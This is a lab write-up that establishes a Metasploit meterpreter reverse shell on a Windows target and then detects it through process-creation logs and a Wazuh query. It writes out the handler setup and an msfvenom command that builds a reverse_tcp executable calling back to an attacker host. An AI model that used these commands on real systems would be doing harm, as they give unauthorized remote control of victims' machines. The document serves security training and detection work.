# 🔵 Reverse Shell

## 📌 Overview

In this stage, a reverse shell was established to simulate remote command execution on the target system.

After gaining initial access, this step demonstrates how an attacker can gain full control over the system.

---

## 🎯 Objective

- Execute a payload on the target system  
- Establish a reverse connection  
- Gain remote command access  
- Analyze detection through logs  

---

## ⚙️ Lab Setup

- Attacker Machine: Kali Linux  
- Target Machine: Windows  
- Tool Used: Metasploit  

---

## ⚔️ Attack Execution

### 🔹 Step 1 — Start Metasploit

``` bash
msfconsole
```

---

### 🔹 Step 2 — Configure Handler

``` bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <KALI-IP>
set LPORT 4444
run
```

![msf](../screenshots/msf1.png)

---

### 🔹 Step 3 — Generate Payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe


---

### 🔹 Step 4 — Execute Payload

The payload (`shell.exe`) was transferred to the Windows machine and executed.

---


![Payload Execution](../screenshots/msf3.png)

---

## ✅ Result

Once the payload was executed, a reverse connection was established.

Meterpreter session opened:


meterpreter >


This confirms that the attacker gained remote control over the system.

---

📸 **Meterpreter Session**
![Meterpreter](../screenshots/ms4.png)

---

## 📊 Log Analysis

### 🪟 Windows Logs

- A new process was created  
- Event ID observed: **4688 (Process Creation)**  

---

---

### 🛡️ Wazuh Detection

The following query was used:


data.win.system.eventID: 4688


### 🔍 Observations

- Suspicious executable execution (`shell.exe`)  
- New process created  
- Unusual activity detected  

---

## 🧠 Analysis

- Reverse shell allows attackers to bypass inbound firewall restrictions  
- The connection is initiated from the victim to the attacker  
- This technique is commonly used in real-world attacks  
- Process creation logs are critical for detecting such activity  

---

## 🧬 MITRE ATT&CK Mapping

- **T1059 — Command and Scripting Interpreter**

---

## 🧠 Key Learnings

- Reverse shells provide full control over the system  
- Outbound connections can be more dangerous than inbound  
- Monitoring process creation is essential for detection  
- SIEM tools help identify suspicious execution patterns  

---

## 🧾 Conclusion

A reverse shell was successfully established using Metasploit. The activity was detected through process creation logs and analyzed using Wazuh, demonstrating how execution-based attacks can be monitored in a real-world environment.
